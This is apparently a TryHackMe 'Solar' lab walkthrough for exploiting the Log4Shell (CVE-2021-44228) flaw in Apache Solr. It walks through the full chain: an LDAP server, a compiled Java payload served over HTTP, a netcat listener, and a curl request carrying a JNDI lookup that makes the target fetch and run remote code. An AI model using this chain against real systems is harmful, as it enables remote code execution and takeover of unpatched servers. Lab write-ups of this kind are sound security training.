💻 -n3rdh4x0r-

# exploiting log4j CVE-2021-44228 ( TryHackMe Solar, Walkthrough)

```
git clone https://github.com/n3rdh4x0r/log4j.git 

```

## 1. run log4j.py (This whill install all the nessasary applications and start the LDAP server)

```
ifconfig tun0
python3 log4j.py 10.8.227.251

```

![image](https://user-images.githubusercontent.com/66146701/146671807-61ee758c-586b-4d45-9d50-34e7e6c4fa04.png)


## 2. Add attacker IP to Exploit.java file


![2021-12-19_00-52](https://user-images.githubusercontent.com/66146701/146672140-a1e70a73-1c3b-4e1b-a5c5-aeebf4def563.png)


## 3. Compile payload

```
javac Exploit.java -source 8 -target 8

```
![image](https://user-images.githubusercontent.com/66146701/146672281-b07fda17-a0a6-473d-8e15-bc717144d184.png)

## 4. temporary HTTP server

```
python3 -m http.server 8888

```
![image](https://user-images.githubusercontent.com/66146701/146672342-69d18b1e-e605-4906-8ee9-51868033fb6e.png)


## 5. netcat listener

```
nc -lnvp 9999

```

![image](https://user-images.githubusercontent.com/66146701/146672355-780ef25c-b3b6-4e5a-8480-ba091b95a876.png)


## 6. Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit:

```
curl 'http://10.10.45.175:8983/solr/admin/cores?foo=$\{jndi:ldap://10.8.227.251:1389/Exploit\}'

```

![image](https://user-images.githubusercontent.com/66146701/146672401-33233c9c-6d91-4923-96b0-fcf3b458e5db.png)


![image](https://user-images.githubusercontent.com/66146701/146672408-cbed5a01-ff4a-4cab-81e5-8704d7674a5d.png)

